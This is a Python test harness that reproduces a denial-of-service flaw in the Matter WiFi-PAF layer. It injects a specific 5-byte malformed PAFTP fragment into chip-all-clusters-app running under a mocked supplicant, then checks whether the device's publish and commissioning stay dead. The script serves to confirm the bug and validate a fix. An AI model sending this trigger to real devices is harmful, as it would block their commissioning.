#!/usr/bin/env python3
# Sister script to wifipaf_malformed_cap_repro.py.
#
# Validates the deterministic WiFi-PAF publish-cancel DoS by checking the
# *publish state* and *recoverability* after sending the malformed cap-request,
# rather than just looking at the app's exit code. The base harness reports
# rc=0 ("clean shutdown, no crash") for this attack — which is misleading
# because the publish has been cancelled and commissioning is no longer
# possible. This script reports VULNERABLE / NOT-REPRODUCED instead.
#
# Usage:
#   sudo -E python3 scripts/tests/wifipaf_publish_cancel_dos_check.py \
#       [--expect-patched] \
#       /path/to/chip-all-clusters-app
#
#   Default mode (no flag): expects an UNPATCHED build. Exits 0 if the DoS
#   reproduced as designed, 1 if it did not (i.e., build may already be patched).
#
#   --expect-patched: inverts the verdict. Exits 0 if NO DoS observed (fix
#   appears effective), 1 if the DoS still reproduces.
#
# Detection logic:
#   1. Spawn chip-all-clusters-app under WpaSupplicantMock.
#   2. Wait for NANPublish (publisher up).
#   3. Inject NANReplied (fake subscriber discovery; creates an endpoint).
#   4. Inject NANReceive carrying the 5-byte deterministic trigger \x01\x00\x01\x00\x00.
#   5. Probe A: does the mock's NAN session table for the publisher iface
#      go empty within ~2s? Empty == publish cancelled.
#   6. Probe B: emit a fresh NANReplied. If the publisher had a live publish,
#      this would route to it. If the publish is dead, the mock raises
#      "No publish on <iface>" — that's the persistence signature.
#   7. DoS observed iff (publish session empty) AND (re-discovery fails).

import argparse
import asyncio
import os
import signal
import struct
import subprocess
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..",
                                "src", "python_testing",
                                "matter_testing_infrastructure"))

from matter.testing.linux import (  # noqa: E402
    DBusTestSystemBus, IsolatedNetworkNamespace, WpaSupplicantMock,
)

APP_IFACE = "wlx-app"
TOOL_IFACE = "wlx-tool"

# 5-byte malformed PAFTP fragment that triggers the deterministic publish
# cancel: PAFTransportCapabilitiesRequestMessage::Decode at
# src/wifipaf/WiFiPAFLayer.cpp:171 returns CHIP_ERROR_MESSAGE_INCOMPLETE,
# which propagates to DoClose -> FinalizeClose -> WiFiPAFCloseSession ->
# nancancel_publish.
DETERMINISTIC_TRIGGER = bytes([0x01, 0x00, 0x01, 0x00, 0x00])


def _run_on_loop(mock, fn):
    async def _run():
        fn()
    asyncio.run_coroutine_threadsafe(_run(), mock.loop).result(timeout=5)


def emit_discovery(mock, iface_name, discriminator=0xF00):
    """Emit a NANReplied so the publisher creates a WiFiPAFEndPoint.
    Raises RuntimeError if no publish is currently active on the interface."""
    iface = mock.nan_simulator.interfaces[iface_name]
    if not iface.nan_sessions:
        raise RuntimeError(f"No publish on {iface_name}")
    pub_id = next(iter(iface.nan_sessions))
    ssi = struct.pack("<BHHH", 0x00, discriminator, 0x8001, 0xFFF1)
    replied = {
        "publish_id": ("u", pub_id),
        "subscribe_id": ("u", 0xdead),
        "peer_addr": ("s", "aa:bb:cc:dd:ee:ff"),
        "srv_proto_type": ("u", 3),
        "ssi": ("ay", ssi),
    }
    _run_on_loop(mock, lambda: iface.NANReplied.emit(replied))


def inject_nan_receive(mock, iface_name, ssi):
    """Emit a NANReceive carrying the malformed payload."""
    iface = mock.nan_simulator.interfaces[iface_name]
    if not iface.nan_sessions:
        raise RuntimeError(f"No active NAN session on {iface_name}")
    session_id = next(iter(iface.nan_sessions))
    args = {
        "id": ("u", session_id),
        "peer_id": ("u", 0xdead),
        "peer_addr": ("s", "aa:bb:cc:dd:ee:ff"),
        "ssi": ("ay", ssi),
    }
    _run_on_loop(mock, lambda: iface.NANReceive.emit(args))


def wait_for_publish(mock, timeout=60.0):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        iface = mock.nan_simulator.interfaces.get(APP_IFACE)
        if iface and iface.nan_sessions:
            return
        time.sleep(0.1)
    raise TimeoutError("Publisher never called NANPublish")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--expect-patched", action="store_true",
                        help="Invert verdict. Default: PASS iff DoS reproduces "
                             "(unpatched build). With this flag: PASS iff DoS "
                             "does NOT reproduce (validates the fix).")
    parser.add_argument("--retries", type=int, default=3,
                        help="Re-discovery attempts after the attack to confirm "
                             "the publish stays dead (default 3).")
    parser.add_argument("--retry-delay", type=float, default=1.0,
                        help="Seconds between re-discovery attempts (default 1.0).")
    parser.add_argument("app_bin", help="Path to chip-all-clusters-app")
    args = parser.parse_args()

    if os.geteuid() != 0:
        print("FATAL: must run as root (netns + private system bus).",
              file=sys.stderr)
        sys.exit(2)
    app_bin = os.path.abspath(args.app_bin)

    # Wipe persistent state so the app boots into commissioning mode.
    for stale in ("/tmp/chip_kvs", "/tmp/chip_counters.ini",
                  "/tmp/chip_factory.ini", "/tmp/chip_config.ini"):
        try:
            os.remove(stale)
        except FileNotFoundError:
            pass
        except OSError as e:
            print(f"[harness] could not remove {stale}: {e}", flush=True)

    bus = DBusTestSystemBus()
    ns = IsolatedNetworkNamespace(
        index=0, app_link_up=False,
        app_link_name=APP_IFACE, tool_link_name=TOOL_IFACE)
    mock = WpaSupplicantMock([APP_IFACE, TOOL_IFACE],
                             "MatterAP", "MatterAPPassword", ns)

    app = None
    publish_alive_after_attack = None
    rediscovery_succeeded = False

    try:
        env = {**os.environ, "DBUS_SYSTEM_BUS_ADDRESS": DBusTestSystemBus.ADDRESS,
               "G_MESSAGES_DEBUG": "all"}
        cmd = ns.app_ns.wrap_cmd([app_bin, "--wifi", "--wifipaf", "freq_list=2437"])
        print(f"[harness] launching: {' '.join(cmd)}", flush=True)
        app = subprocess.Popen(cmd, env=env)

        print("[harness] waiting for NANPublish ...", flush=True)
        wait_for_publish(mock)
        print("[harness] publisher up; faking subscriber discovery", flush=True)
        time.sleep(1.0)
        emit_discovery(mock, APP_IFACE)
        time.sleep(1.0)

        # --- Attack ---
        print(f"[harness] sending deterministic malformed PAFTP fragment "
              f"({DETERMINISTIC_TRIGGER.hex()}, {len(DETERMINISTIC_TRIGGER)} bytes)",
              flush=True)
        inject_nan_receive(mock, APP_IFACE, DETERMINISTIC_TRIGGER)

        # --- Probe A: publish session state in the mock ---
        time.sleep(2.0)
        iface = mock.nan_simulator.interfaces[APP_IFACE]
        publish_alive_after_attack = bool(iface.nan_sessions)
        print(f"[harness] probe A: post-attack publish session table = "
              f"{'alive' if publish_alive_after_attack else 'EMPTY'} "
              f"(sessions={list(iface.nan_sessions)})",
              flush=True)

        # --- Probe B: re-discovery attempts ---
        for n in range(args.retries):
            time.sleep(args.retry_delay)
            if app.poll() is not None:
                print(f"[harness] probe B: app died unexpectedly during retry {n+1}",
                      flush=True)
                break
            try:
                emit_discovery(mock, APP_IFACE)
                rediscovery_succeeded = True
                print(f"[harness] probe B: re-discovery {n+1}/{args.retries} "
                      f"SUCCEEDED — publish recovered or never died",
                      flush=True)
                break
            except RuntimeError as e:
                print(f"[harness] probe B: re-discovery {n+1}/{args.retries} "
                      f"failed: {e}",
                      flush=True)

        # --- Verdict ---
        dos_observed = (not publish_alive_after_attack) and (not rediscovery_succeeded)

        print()
        print("============================================================")
        print(f"  Publish session alive after attack: {publish_alive_after_attack}")
        print(f"  Re-discovery succeeded:             {rediscovery_succeeded}")
        print(f"  DoS observed:                       {dos_observed}")
        print("============================================================")

        if args.expect_patched:
            if dos_observed:
                print("  VERDICT: FAIL — DoS still reproduces; fix NOT effective")
                exit_code = 1
            else:
                print("  VERDICT: PASS — no DoS observed; fix appears effective")
                exit_code = 0
        else:
            if dos_observed:
                print("  VERDICT: VULNERABLE — DoS reproduced "
                      "(unpatched build, as expected)")
                exit_code = 0
            else:
                print("  VERDICT: NOT REPRODUCED — DoS did not occur")
                print("           (build may already be patched, or env mismatch)")
                exit_code = 1
        print("============================================================")
        sys.exit(exit_code)

    finally:
        if app is not None and app.poll() is None:
            app.send_signal(signal.SIGTERM)
            try:
                app.wait(timeout=5)
            except subprocess.TimeoutExpired:
                app.kill()
        mock.terminate()
        ns.terminate()
        bus.terminate()


if __name__ == "__main__":
    main()
